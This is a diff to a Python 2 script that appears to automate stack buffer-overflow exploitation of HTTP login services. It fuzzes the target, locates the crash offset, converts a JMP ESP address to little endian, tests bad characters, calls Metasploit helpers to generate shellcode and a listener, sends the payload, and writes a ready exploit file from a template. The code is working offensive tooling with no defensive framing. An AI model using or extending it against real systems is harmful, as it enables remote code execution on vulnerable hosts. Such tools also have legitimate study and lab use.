@@ -11,7 +11,7 @@ import readline
 import requests
 import os
 import sys
-
+from subprocess import check_output 
 
 W='\033[0m'     
 R='\033[31m'    
@@ -21,17 +21,35 @@ B='\033[34m'
 P= '\033[35m'   
 Y="\033[1;33m"   
 
+try:  
+   if sys.argv[0] and '-c' in sys.argv[1] and  len(sys.argv[1])==2\
+   and'off' in sys.argv[2] and\
+   len(sys.argv[2])==3 :
+      W = ''     
+      R = ''    
+      G = ''  
+      O = ''     
+      B = ''    
+      P = ''   
+      Y = ''   
+   else: 
+       W='\033[0m'     
+       R='\033[31m'
+       print R+'[*]\n'+W+R+'PLZ SET THE COLOR TO OFF -c off'+W+'\n'+R+'='*25+'\n'
+       exit()  
+except IndexError:
+          try:
+            if sys.argv[1]:
+               W='\033[0m'     
+               R='\033[31m'
+               print R+'[*]\n'+W+R+'PLZ SET THE COLOR TO OFF -c off'+W+'\n'+R+'='*25+'\n'
+               exit()   
+          except IndexError:
+               pass  
 class HTTPLOGIN():
     
      def __init__(self):
-           
-            global W
-            global R
-            global G
-            global O
-            global B
-            global P
-            global Y  
+ 
             with open('shell_code.py','w') as shell_code:
                  shell_code.write('# pls add your shellcode '+'\n'+'shell_code =()')  
             mode = """
@@ -49,8 +67,8 @@ class HTTPLOGIN():
             self.connect_servser()
             self.Option_return()
             self._hexadecimal() 
-            self.import_char()
-            self.little_endian()        
+            self.little_endian() 
+            self.import_char()              
             self.attack_all()
             self.auto_write()
      def web_req(self):
@@ -66,9 +84,8 @@ class HTTPLOGIN():
                 if response.ok == True:
                      pass
             except Exception:
-                print Y+"\n[#]"+W+R+"Please Check Service" +W+Y+"[#]"+W
-                time.sleep(2)
-                print Y+"\n[#]"+W+R+"Service Not Runing" +W+Y+"[#]"+W 
+                print Y+"\n\r\r!---___"+W+R+ "Service Not Runing"+W+Y+'___---!'+W 
+                time.sleep(0.75)
                 return  self.web_req()    
             except KeyboardInterrupt:
                 print Banner
@@ -90,6 +107,8 @@ class HTTPLOGIN():
                     String = "A"
                     Fuzzer = 100
                     password = 'admin'
+                    banner2=Y+'\n\t\tFUZZING OPTIONS'+'\n\t   '+('='*22)
+                    print banner2
                     print O+"\n>>>>"+W+R+"Fuzzing in process "+W 
                     try:
                         try:
@@ -112,18 +131,28 @@ class HTTPLOGIN():
                              if  Fuzzer > 100:                           
                                  print O+"\n>>>>>"+W+P+"Fuzzing Stop at " +W+Y+str(Fuzzer)+W+ R+ " Characters"+W 
                              else:
-                               print Y+"\n[+]"+W+R+"String Pattern NOT Generated "+W 
-                               time.sleep(1)
-                               print Y+"\n[+]"+W+B+"service is down "+W 
-                               time.sleep(1)
-                               self.web_req()
-                               self.Fuzzing__()
+                                print Y+"\n\r\r!---___"+W+R+ "String Pattern NOT Generated"+W+Y+'___---!'+W
+                                time.sleep(1)
+                                print Y+"\n\r\r!---___"+W+R+ "service not repoinding "+W+Y+'___---!'+W
+                                time.sleep(1)
+                                self.ip_port()
+                                self.Fuzzing__() 
+                                self.string_ramdon() 
+                                self.connect_servser() 
+                                self.Option_return()
+                                self._hexadecimal()
+                                 
+                                self.import_char()                                   
+                                self.attack_all()
+                                self.auto_write()
+                                
                     except KeyboardInterrupt:
                         print  Banner
                         exit() 
 
                     try:
-                        input= raw_input(O+"\n[]>>>>>>"+W+R+"Please Restart the Application then Press Enter to Continue"+W+O+"<<<<<<<[]"+W)
+                        print Y+"\n\r\r!---___"+W+P+ "Buffer OverFlow discover"+W+Y+'___---!'+W 
+                        input= raw_input(O+"\n\t\t!_________application  not repoinding restart then Press any key to Continue________! \n"+W)
                     except NameError:
                            pass	                                                        
                     self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(int(Fuzzer))).lower()  
@@ -135,8 +164,8 @@ class HTTPLOGIN():
                            self.connect_servser() 
                            self.Option_return()
                            self._hexadecimal() 
-                           self.import_char()
-                           self.little_endian()        
+                           self.little_endian()  
+                           self.import_char()                                
                            self.attack_all()
                            self.auto_write()   
                                                                                                                                                                           
@@ -148,7 +177,9 @@ class HTTPLOGIN():
                     print  Banner
                     exit()
                    
-     def string_ramdon(self):        
+     def string_ramdon(self): 
+             banner2=Y+'\n\t\tString Pattern'+'\n\t   '+('='*22)
+             print banner2        
              try:                      
 	 	    Requst_String = int (raw_input(O+"\n[+]"+W+B+"Enter the length of Pattern :"+W))
 		    time.sleep(2)
@@ -157,7 +188,7 @@ class HTTPLOGIN():
 		    print Y+"\n[+]"+W+R+"String Pattern is Generated in length :"+W,len(self.Random_String )#,"\n\n",(self.Random_String).strip()
              except Exception:
                     time.sleep(2)
-                    print Y+"\n[()]"+W+R+"Check input integer Required"+W+Y +"[()]"+W
+                    print Y+"\n\r\r!---___"+W+R+ "Check input integer Required"+W+Y+'___---!'+W
                     return self.string_ramdon()		 
              except KeyboardInterrupt:
                     print  Banner
@@ -181,17 +212,18 @@ class HTTPLOGIN():
                        response = session.post(self.target_url,data=data,timeout=3)
                           
                     except :
-                 	   print Y+"\n[+]"+W+R+"Data Send Successful"+W+Y+"...!!!"+W
+                 	   print Y+"\n\r\r!---___"+W+R+ "Data Send Successful"+W+Y+'___---!'+W
                  	   time.sleep(2)
-                 	   print Y+"\n[+]"+W+R+"please Restart The Service"+W+Y+"...!!!"+W
+                           print Y+"\n\r\r!---___"+W+R+ "please Restart The Service"+W+Y+'___---!'+W
                  	   break
                else:
-                   print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W 
-                   print Y+"\n[+]"+W+R+"please Restart The Service and try agin"+W+Y+"...!!!"+W  	   
+                   print Y+"\n\r\r!---___"+W+P+"Connection is Down Socket.Erro"+W+Y+'___---!'+W
+                   time.sleep(1)
+                   print Y+"\n\r\r!---___"+W+P+"please Restart The Service and try agin"+W+Y+'___---!'+W	   
                    self.connect_servser()
             except requests.exceptions.ReadTimeout:
-                print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W 
-                print Y+"\n[+]"+W+P+"please Restart The Service and try agin"+W+Y+"...!!!"+W 
+                print Y+"\n\r\r!---___"+W+P+"Connection is Down Socket.Erro"+W+Y+'___---!'+W
+                print Y+"\n\r\r!---___"+W+P+"please Restart The Service and try agin"+W+Y+'___---!'+W	
                 self.Fuzzing__()
                 self.connect_servser()
         except KeyboardInterrupt:
@@ -218,7 +250,8 @@ class HTTPLOGIN():
                    exit()
                                
      def _hexadecimal(self):
-                                                                                   
+          banner2=Y+'\n\t\tCRACH ADDRESS'+'\n\t   '+('='*22)+W
+          print banner2                                                                         
           while True:
                  try: 
 		    self.hexadecimal =str(raw_input(O+"\n[+]"+W+B+"Enter Hexadecimal Crach address: "+W)).upper()
@@ -232,49 +265,69 @@ class HTTPLOGIN():
 		       print Y+"\n[+]"+W+P+"Exact Satch at Offset"+W+B+" : "+W,self.location	              
                        break
 		    else:
-	               print Y+"\n[(*)]"+W+R+"THE VALUE  OF THE ADDRESS Not FOUND  IN OUR STRING"+W+Y+"[(*)] "+W
+	               print Y+"\n\r\r!---___"+W+R+ "THE VALUE  OF THE ADDRESS Not FOUND  IN OUR STRING"+W+Y+'___---!'+W
 	               time.sleep(2)
 	               return self._hexadecimal() 
 	                
 	         except Exception:
-	               print Y+"\n[(*)]"+W+R+"THE VALUE  OF THE ADDRESS Not FOUND "+W+Y+"[(*)] "+W  
-	               return self._hexadecimal()                  
-		     
-	        
+	               print Y+"\n\r\r!---___"+W+R+ "THE VALUE  OF THE ADDRESS Not FOUN"+W+Y+'___---!'+W 
+	               return self._hexadecimal()               	        
                  except KeyboardInterrupt:
                        print  Banner
                        exit() 
      def import_char(self): 
          try:
-            
+            banner2 = Y+'\n\t\tBad_Character'+'\n\t   '+('='*22)+W
+            print banner2            
+            time.sleep(1)
             Bad = "yes".lower()
             Bad_no = "no".lower()                 
-            bad_op = str(raw_input(Y+"\n[<>]"+W+R+"To Test Bad_Character Enter "+W+B+"yes "+W+R +"To Skip Enter "+W+B+" no : "+W)).lower()
-            
+            bad_op = str(raw_input(Y+"\n[+] "+W+R+"Test Bad_Character Enter "+W+B+"yes "+W+R +"Skip Enter "+W+B+" no : "+W)).lower()            
             if bad_op == Bad and len(Bad)==3: 
                 banner = """  
                     ========================                          
                       Bad_Character start
-                    ========================\n 
-                     """
-                print B+banner+W 
+                    ======================== 
+                    """
+                print P+banner+W 
                 with open('.data','w')as data :
-                    data1 = data.write(self.target_url+'\n'+str(self.location))                             
+                    data1 = data.write(self.server_ip+'\n'+str(self.server_port)+'\n'+str(self.location))         
                 time.sleep(2)
-                from Bad_Character import Bad_Character_SyncBreeze             
-                run = Bad_Character_SyncBreeze()
+                from Bad_Character import Bad_Character             
+                run = Bad_Character()
+                from Msf_Helper  import Msf_Helper
+                go = Msf_Helper()
             elif bad_op ==Bad_no and len(Bad_no)==2: 
-                print R+"\n\t\t!___To Continue Explit Generate shellcode and post it in shell_code.py file___! \n"+W 
-                pass
+                time.sleep(0.30)
+                print Y+"\n\r\r!---___"+W+O+"Default BadCharacter = "+W+P+"'\\x00'"+W+Y+'___---!'+W
+                self.badchar ='\\x00'
+                ok = 'yes'.lower()
+                no = 'no'.lower()
+                time.sleep(0.75)
+                banner2 = Y+'\n\t\tSCHELLCODE & LISTNER'+'\n\t     '+('='*25)+W
+                print banner2
+                opt_code = str(raw_input(O+"\n[$] "+W+B+"Generate ShellCode and Listner " +W+Y+"'Yes'" +W+B+ " skip Enter " +W+Y+"'no'"+W+B+' : '+W)).lower()
+                if opt_code == ok and len(opt_code)==3 :		              
+                    time.sleep(1)                                     
+                    host_ip   = check_output(['hostname', '--all-ip-addresses']).decode('utf8').replace('\n','')
+                    with open('.data','w')as data :
+                         data1 = data.write(self.badchar+'\n'+host_ip.replace(' ','\n'))
+                    from Msf_Helper  import Msf_Char_NO
+                    go = Msf_Char_NO()
+                elif opt_code == no and len(opt_code)==2 :                     
+                    stop  = str(raw_input(R+"\n\t\t!___To Continue Exploit Generate shellcode and post it in shell_code.py file___! \n"+W ))     
+                    pass
             else:
               print Y+"\n[-]"+W+R+"Please Enter "+W+B+"yes"+W+R+" or"+W+B+" no"+W+Y+" [-]"+W 
               self.import_char()                   
          except KeyboardInterrupt:
                 print  Banner
-                exit()                                  
+                exit()          
+                   
          
      def little_endian(self):
-         
+               banner2=Y+'\n\t\tJMP ESP'+'\n\t   '+('='*22)+W
+               print banner2
                try:
                     jump= str(raw_input(O+"\n[+]"+W+B+" Enter JMP ESP addrsss HEX  : "+W)).upper()
                     if len(jump) < 4 :
@@ -291,14 +344,15 @@ class HTTPLOGIN():
                     self.jump_address = ('0'*(len(self.jump_address) % 2) +self.jump_address).decode('hex') 
                     print Y+"\n[+]"+W+P+"little endian JMP ESP  is "+W+B+": "+W,R+self.display+W
                except Exception:
-	               print Y+"\n[(*)]"+W+R+"TypeError: Non-hexadecimal digit found "+W+Y+"[(*)] "+W  
+	               print Y+"\n\r\r!---___"+W+R+ "TypeError: Non-hexadecimal digit found"+W+Y+'___---!'+W 
 	               return self.little_endian()                       
                except KeyboardInterrupt:
                     print  Banner
                     exit()
                                 
      def attack_all(self):
-       
+               banner2=Y+'\n\t\tFainal Status'+'\n\t   '+('='*22)+W                                       
+               print banner2       
 	       from shell_code import shell_code  
 	       if len(shell_code) < 50:
                      print P+"\n\t\t\t\t!__________________EXPLOIT__Fail__________________!"+W
@@ -337,8 +391,8 @@ class HTTPLOGIN():
                              print B +"\n[+]"+W+R+"WE READY TO ATTACK !!"+W+B+"[+]"+W 
                              time.sleep(2)
                              print R+"\n\t\t\t!__________________EXPLOIT__SACUSSED__________________!"+W 
-                   except Exception : 
-                       print O+"\n[(!)]"+W+Y+"Connection is Down >> requests.exceptions.ConnectionError"+W 
+                   except Exception ,exc : 
+                       print Y+"\n\r\r!---___"+W+P+ "application  not repoinding Socket.Error "+W+O+"%s" %exc+W+Y+'___---!'+W      
                        self.little_endian()
                        self.attack_all()               
                except KeyboardInterrupt:
@@ -346,12 +400,12 @@ class HTTPLOGIN():
                    exit()  
                    
      def auto_write(self): 
-                from shell_code import shell_code 
+                 from shell_code import shell_code      	     
                 try:                
                   shell =str(shell_code).encode("hex")
                   shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
                   self.shell_code= "".join('\n"%s"'%shell1[i:i+56] for i in range(0, len(shell1),56))
-                  copy_format= shutil.copy("./TemplateExploit/payload3.txt",'./ExploitStore/'+self.app_name+"_Exploit.py") 
+                  copy_format= shutil.copy("./TemplateExploit/payload3.txt",'./ExploitStore/'+self.app_name+"_Exploit.py")
                      
                   file= './ExploitStore/'+self.app_name+"_Exploit.py"
                   for line in fileinput.FileInput(file,inplace=1):
